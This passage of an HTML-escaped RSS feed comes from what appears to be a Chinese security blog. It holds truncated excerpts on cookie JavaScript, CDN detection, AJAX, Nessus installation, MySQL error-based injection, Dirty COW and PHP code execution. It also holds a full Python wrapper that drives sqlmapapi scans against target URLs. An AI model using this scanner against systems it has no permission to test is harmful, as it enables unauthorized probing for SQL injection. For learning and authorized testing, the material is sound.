 &amp;#39;set&amp;#39;: set,
 &amp;#39;getCookies&amp;#39;: getCookies,
 &amp;#39;getCookie&amp;#39;: getCookie,
 &amp;#39;remove&amp;#39;: remove,
 &amp;#39;clear&amp;#39;: clear,
 &amp;#39;noConflict&amp;#39;: noConflict
 };
})(window);
&lt;/code>&lt;/pre>&lt;h3 id="0x02-利用的ahtml源码">0x02 利用的a.html源码&lt;/h3>
&lt;pre tabindex="0">&lt;code>&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
 &amp;lt;head&amp;gt;
 &amp;lt;meta charset=&amp;#34;utf-8&amp;#34;&amp;gt;
 &amp;lt;title&amp;gt;cookie example&amp;lt;/title&amp;gt;
 &amp;lt;/head&amp;gt;
 &amp;lt;body&amp;gt;
 &amp;lt;script type=&amp;#34;text/javascript&amp;#34; src=&amp;#34;./cookie.js&amp;#34; &amp;gt;&amp;lt;/script&amp;gt;
 &amp;lt;script type=&amp;#34;text/javascript&amp;#34;&amp;gt;
 console.log(&amp;#39;----------cookie对象-------------&amp;#39;);
 console.log(cookie);
 console.log(&amp;#39;----------对象-------------&amp;#39;);
 console.log(cookie.getCookies());
 console.log(&amp;#39;----------设置cookie-------------&amp;#39;);
 console.log(cookie.set(&amp;#39;name&amp;#39;, &amp;#39;wlh&amp;#39;));
 console.log(&amp;#39;----------设置cookie 123-------------&amp;#39;);
 console.log(cookie.set(&amp;#39;name&amp;#39;, &amp;#39;wlh123&amp;#39;));
 console.log(&amp;#39;----------设置cookie age-------------&amp;#39;);
 console.log(cookie.set(&amp;#39;age&amp;#39;, 20));
 // alert(document.cookie);
 console.log(&amp;#39;----------获取cookie-------------&amp;#39;);
 console.log(cookie.getCookie(&amp;#39;name&amp;#39;));
 console.log(&amp;#39;----------获取所有-------------&amp;#39;);
 console.log(cookie.getCookies());
 console.log(&amp;#39;----------清除age-------------&amp;#39;);
 console.log(cookie.remove(&amp;#39;age&amp;#39;));
 console.log(&amp;#39;----------获取所有-------------&amp;#39;);
 console.log(cookie.getCookies());
 console.log(&amp;#39;----------清除所有-------------&amp;#39;);
 console.log(cookie.clear());
 console.log(&amp;#39;----------获取所有-------------&amp;#39;);
 console.log(cookie.getCookies());
 console.log(&amp;#39;----------解决冲突-------------&amp;#39;);
 var $Cookie = cookie.noConflict(true /*a new name of cookie*/);
 console.log($Cookie);
 console.log(&amp;#39;----------使用新的命名-------------&amp;#39;);
 console.log($Cookie.getCookies());
 &amp;lt;/script&amp;gt;
 &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;h3 id="0x03-结果">0x03 结果&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/js_cookie.png" alt="调用封装文件操作cookie">&lt;/p></description></item><item><title>Python 实现 CDN 的判断</title><link>https://wyb0.cn/posts/2016/cdn-detection/</link><pubDate>Fri, 23 Dec 2016 21:10:05 +0000</pubDate><guid>https://wyb0.cn/posts/2016/cdn-detection/</guid><description>&lt;p>&lt;img src="https://wyb0.cn/img/anime/anime002.jpg" alt="银魂">&lt;/p>
&lt;h3 id="0x00-什么是cdn">0x00 什么是CDN&lt;/h3>
&lt;pre tabindex="0">&lt;code>CDN的全称是Content Delivery Network，即内容分发网络。主要功能是在不同地点缓存内容，
运营商会在全国各地的节点上缓存你的网站网页，通过负载均衡技术，将用户的请求定向到最合适的
缓存服务器上去获取内容，比如说你是上海用户，你访问www.aa.com就会被重定向到上海的节点，
你是北京用户，你也访问www.aa.com，但是你会被重定向到上海的节点。
&lt;/code>&lt;/pre>&lt;h3 id="0x01-判断方法">0x01 判断方法&lt;/h3>
&lt;ul>
&lt;li>可以查询CNAME记录，每个cdn厂商都有特有的特征串&lt;/li>
&lt;li>查看http返回头的头部信息&lt;/li>
&lt;/ul>
&lt;h3 id="0x02-代码">0x02 代码&lt;/h3>
&lt;p>首先安装dnspython这个第三方模块：pip install dnspython&lt;/p></description></item><item><title>AJAX 与 PHP</title><link>https://wyb0.cn/posts/2016/ajax-and-php/</link><pubDate>Wed, 16 Nov 2016 10:37:03 +0000</pubDate><guid>https://wyb0.cn/posts/2016/ajax-and-php/</guid><description>&lt;h3 id="0x00-ajax与php">0x00 AJAX与PHP&lt;/h3>
&lt;p>ajax.html代码如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
 &amp;lt;meta charset=&amp;#34;utf-8&amp;#34;&amp;gt;
 &amp;lt;script&amp;gt;
 function showHint(str) {
 var xmlhttp;
 if (str.length==0) { 
 document.getElementById(&amp;#34;txtHint&amp;#34;).innerHTML=&amp;#34;&amp;#34;;
 return;
 }
 if (window.XMLHttpRequest) {
 // IE7+, Firefox, Chrome, Opera, Safari 浏览器执行代码
 xmlhttp=new XMLHttpRequest(); //创建对象
 } else {
 // IE6, IE5 浏览器执行代码
 xmlhttp=new ActiveXObject(&amp;#34;Microsoft.XMLHTTP&amp;#34;);
 }
 xmlhttp.onreadystatechange=function() {
 if (xmlhttp.readyState==4 &amp;amp;&amp;amp; xmlhttp.status==200) {
 document.getElementById(&amp;#34;txtHint&amp;#34;).innerHTML=xmlhttp.responseText;
 }
 }
 xmlhttp.open(&amp;#34;GET&amp;#34;,&amp;#34;./ajax.php?q=&amp;#34;+str,true);
 xmlhttp.send();
 }
 &amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
 &amp;lt;h3&amp;gt;在输入框中尝试输入字母 a:&amp;lt;/h3&amp;gt;
 &amp;lt;form action=&amp;#34;&amp;#34;&amp;gt; 
 输入姓名: &amp;lt;input type=&amp;#34;text&amp;#34; id=&amp;#34;txt1&amp;#34; onkeyup=&amp;#34;showHint(this.value)&amp;#34; /&amp;gt;
 &amp;lt;/form&amp;gt;
 &amp;lt;p&amp;gt;提示信息: &amp;lt;span id=&amp;#34;txtHint&amp;#34;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/p&amp;gt; 
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>上面的代码会完成以下的东西：

1. 在输入字母时会调用showHint()
2. showHint()创建对象
3. 定义onreadystatechange事件
4. xmlhttp.open()访问当前目录下的ajax.php来请求资源
&lt;/code>&lt;/pre>&lt;p>ajax.php代码如下：&lt;/p></description></item><item><title>[转] MySQL 报错注入原理分析(count()、rand()、group by)</title><link>https://wyb0.cn/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/</link><pubDate>Sun, 13 Nov 2016 11:59:26 +0000</pubDate><guid>https://wyb0.cn/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/</guid><description>&lt;p>原文链接：&lt;a href="http://drops.wooyun.org/tips/14312?_blank">http://drops.wooyun.org/tips/14312&lt;/a>&lt;/p>
&lt;h3 id="0x00-疑问">0x00 疑问&lt;/h3>
&lt;p>一直在用mysql数据库报错注入方法，但为何会报错？&lt;/p>
&lt;p>&lt;img src="https://wyb0.cn/img/post/wooyun-drops-tips-14312-1.jpg" alt="">&lt;/p>
&lt;p>百度谷歌知乎了一番，发现大家都是把官网的结论发一下截图，然后执行sql语句证明一下结论，但是没有人去深入研究为什么rand不能和order by一起使用，也没彻底说明三者同时使用报错的原理。&lt;/p></description></item><item><title>Nessus 的安装和卸载</title><link>https://wyb0.cn/posts/2016/nessus-install-and-remove/</link><pubDate>Sun, 13 Nov 2016 11:59:26 +0000</pubDate><guid>https://wyb0.cn/posts/2016/nessus-install-and-remove/</guid><description>&lt;h3 id="0x00-下载-nessus-的-deb-安装包">0x00 下载 Nessus 的 deb 安装包&lt;/h3>
&lt;p>去【&lt;a href="http://www.tenable.com/products/nessus/select-your-operating-system?_blank">这里&lt;/a>】，选择家庭版，然后下载对应的安装包
&lt;img src="https://wyb0.cn/img/post/Nessus_Home.png" alt="70">
&lt;img src="https://wyb0.cn/img/post/select_nessus_deb.png" alt="40">&lt;/p>
&lt;h3 id="0x01-本地安装-nessus">0x01 本地安装 Nessus&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/install_nessus.png" alt="60">&lt;/p>
&lt;h3 id="0x02-执行后续安装步骤">0x02 执行后续安装步骤:&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>启动nessus
&lt;img src="https://wyb0.cn/img/post/start_nessus.png" alt="45">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>web访问nessus服务
&lt;img src="https://wyb0.cn/img/post/web_nessus.png" alt="80">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>设置账户和密码
&lt;img src="https://wyb0.cn/img/post/setaccount.png" alt="30">
&lt;img src="https://wyb0.cn/img/post/code.png" alt="50">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>申请code，可以在【&lt;a href="http://www.tenable.com/products/nessus-home">这里&lt;/a>】申请
&lt;img src="https://wyb0.cn/img/post/register_code.png" alt="30">&lt;/p></description></item><item><title>AJAX 的 XHR 请求与响应</title><link>https://wyb0.cn/posts/2016/ajax-request-and-response/</link><pubDate>Tue, 25 Oct 2016 00:53:13 +0000</pubDate><guid>https://wyb0.cn/posts/2016/ajax-request-and-response/</guid><description>&lt;h3 id="0x00-什么是ajax">0x00 什么是AJAX&lt;/h3>
&lt;p>AJAX全称是Asynchronous JavaScript and XML，即异步的JavaScript和XML&lt;br>
AJAX不是新的编程语言，而是一种使用现有标准的新方法。&lt;br>
AJAX可在不重新加载整个页面的情况下与服务器交换数据从而更新部分网页&lt;/p></description></item><item><title>脏牛漏洞</title><link>https://wyb0.cn/posts/2016/dirty-cow-vulnerabilities/</link><pubDate>Sat, 22 Oct 2016 00:10:46 +0000</pubDate><guid>https://wyb0.cn/posts/2016/dirty-cow-vulnerabilities/</guid><description>&lt;h3 id="0x00-测试环境">0x00 测试环境&lt;/h3>
&lt;p>我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，若理解有误则希望大家提意见&lt;/p></description></item><item><title>代码执行漏洞(二)</title><link>https://wyb0.cn/posts/2016/code-execution-vulnerabilities-2/</link><pubDate>Fri, 14 Oct 2016 13:16:32 +0000</pubDate><guid>https://wyb0.cn/posts/2016/code-execution-vulnerabilities-2/</guid><description>&lt;h4 id="接着上一篇代码执行漏洞一posts2016code-execution-vulnerabilities">接着上一篇：&lt;a href="https://wyb0.cn/posts/2016/code-execution-vulnerabilities/">代码执行漏洞(一)&lt;/a>&lt;/h4>
&lt;h3 id="0x00-函数create_function">0x00 函数create_function()&lt;/h3>
&lt;p>php中的函数create_function()可以创建一个匿名函数，其函数原型如下：&lt;/p></description></item><item><title>准则</title><link>https://wyb0.cn/posts/2016/principles/</link><pubDate>Wed, 21 Sep 2016 23:05:57 +0000</pubDate><guid>https://wyb0.cn/posts/2016/principles/</guid><description>&lt;h3 id="0x00-创造价值">0x00 创造价值&lt;/h3>
&lt;p>小鸡问母鸡：可否不用下蛋，带我出去玩啊？母鸡道：不行，我要工作！&lt;br>
小鸡说：可你已经下了这么多蛋了！母鸡意味深长地对小鸡说：一天一个蛋，菜刀靠边站，一月不生蛋，高压锅里见。&lt;br>
存在是因为你创造价值，淘汰是因为你失去价值。过去的价值不代表未来，所以每天都要努力！&lt;/p></description></item><item><title>SqlmapApi 常用方法封装</title><link>https://wyb0.cn/posts/2016/package-sqlmapapi-common-function/</link><pubDate>Wed, 21 Sep 2016 17:37:33 +0000</pubDate><guid>https://wyb0.cn/posts/2016/package-sqlmapapi-common-function/</guid><description>&lt;h3 id="0x00-代码如下">0x00 代码如下&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -*- coding: utf-8 -*-&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> threading
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> json
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> time &lt;span style="color:#f92672">import&lt;/span> sleep
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Sqli&lt;/span>(threading&lt;span style="color:#f92672">.&lt;/span>Thread):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;docstring for AutoSqli&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self, server, target, data&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, referer&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, cookie&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threading&lt;span style="color:#f92672">.&lt;/span>Thread&lt;span style="color:#f92672">.&lt;/span>__init__(self)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>server &lt;span style="color:#f92672">=&lt;/span> server[&lt;span style="color:#ae81ff">0&lt;/span>:&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#66d9ef">if&lt;/span> server[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> server
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>target &lt;span style="color:#f92672">=&lt;/span> target
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>data &lt;span style="color:#f92672">=&lt;/span> data
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>referer &lt;span style="color:#f92672">=&lt;/span> referer
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>cookie &lt;span style="color:#f92672">=&lt;/span> cookie
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>taskid &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>data
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">new_task&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/task/new&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(self&lt;span style="color:#f92672">.&lt;/span>server)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>taskid &lt;span style="color:#f92672">=&lt;/span> json&lt;span style="color:#f92672">.&lt;/span>loads(requests&lt;span style="color:#f92672">.&lt;/span>get(url)&lt;span style="color:#f92672">.&lt;/span>text)[&lt;span style="color:#e6db74">&amp;#39;taskid&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> len(self&lt;span style="color:#f92672">.&lt;/span>taskid)&lt;span style="color:#f92672">&amp;gt;&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Create new task,taskid is: &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>taskid
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">set_option&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> headers &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#e6db74">&amp;#39;Content-Type&amp;#39;&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;application/json&amp;#39;&lt;/span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> option &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#e6db74">&amp;#34;options&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;smart&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">True&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/option/&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/set&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(self&lt;span style="color:#f92672">.&lt;/span>server,self&lt;span style="color:#f92672">.&lt;/span>taskid)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> resp &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>post(url, data&lt;span style="color:#f92672">=&lt;/span>json&lt;span style="color:#f92672">.&lt;/span>dumps(option), headers&lt;span style="color:#f92672">=&lt;/span>headers)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> json&lt;span style="color:#f92672">.&lt;/span>loads(resp&lt;span style="color:#f92672">.&lt;/span>text)[&lt;span style="color:#e6db74">&amp;#39;success&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">start_scan&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> headers &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#e6db74">&amp;#39;Content-Type&amp;#39;&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;application/json&amp;#39;&lt;/span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> payload &lt;span style="color:#f92672">=&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;url&amp;#39;&lt;/span>: self&lt;span style="color:#f92672">.&lt;/span>target,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;data&amp;#39;&lt;/span>: self&lt;span style="color:#f92672">.&lt;/span>data,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;cookie&amp;#39;&lt;/span>: self&lt;span style="color:#f92672">.&lt;/span>cookie,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;referer&amp;#39;&lt;/span>: self&lt;span style="color:#f92672">.&lt;/span>referer
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/scan/&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/start&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(self&lt;span style="color:#f92672">.&lt;/span>server,self&lt;span style="color:#f92672">.&lt;/span>taskid)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">=&lt;/span> json&lt;span style="color:#f92672">.&lt;/span>loads(requests&lt;span style="color:#f92672">.&lt;/span>post(url,data&lt;span style="color:#f92672">=&lt;/span>json&lt;span style="color:#f92672">.&lt;/span>dumps(payload),headers&lt;span style="color:#f92672">=&lt;/span>headers)&lt;span style="color:#f92672">.&lt;/span>text)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> len(str(t[&lt;span style="color:#e6db74">&amp;#39;engineid&amp;#39;&lt;/span>])) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">and&lt;/span> t[&lt;span style="color:#e6db74">&amp;#39;success&amp;#39;&lt;/span>]:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;[&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">] Start scan&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>taskid
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">get_status&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/scan/&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/status&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(self&lt;span style="color:#f92672">.&lt;/span>server,self&lt;span style="color:#f92672">.&lt;/span>taskid)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> status &lt;span style="color:#f92672">=&lt;/span> json&lt;span style="color:#f92672">.&lt;/span>loads(requests&lt;span style="color:#f92672">.&lt;/span>get(url)&lt;span style="color:#f92672">.&lt;/span>text)[&lt;span style="color:#e6db74">&amp;#39;status&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> status &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;running&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#e6db74">&amp;#39;running&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> status &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;terminated&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#e6db74">&amp;#39;terminated&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#e6db74">&amp;#39;error&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">get_data&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/scan/&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/data&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(self&lt;span style="color:#f92672">.&lt;/span>server,self&lt;span style="color:#f92672">.&lt;/span>taskid)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> data &lt;span style="color:#f92672">=&lt;/span> json&lt;span style="color:#f92672">.&lt;/span>loads(requests&lt;span style="color:#f92672">.&lt;/span>get(url)&lt;span style="color:#f92672">.&lt;/span>text)[&lt;span style="color:#e6db74">&amp;#39;data&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> len(data) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#39;[] not injection:&lt;/span>&lt;span style="color:#ae81ff">\t&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>target
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#39;=======&amp;gt; injection:&lt;/span>&lt;span style="color:#ae81ff">\t&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>target
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>data &lt;span style="color:#f92672">=&lt;/span> data
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">delete_task&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/task/&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/delete&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(self&lt;span style="color:#f92672">.&lt;/span>server,self&lt;span style="color:#f92672">.&lt;/span>taskid)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> json&lt;span style="color:#f92672">.&lt;/span>loads(requests&lt;span style="color:#f92672">.&lt;/span>get(url)&lt;span style="color:#f92672">.&lt;/span>text)[&lt;span style="color:#e6db74">&amp;#39;success&amp;#39;&lt;/span>]:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;[&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">] Delete task&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>taskid
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
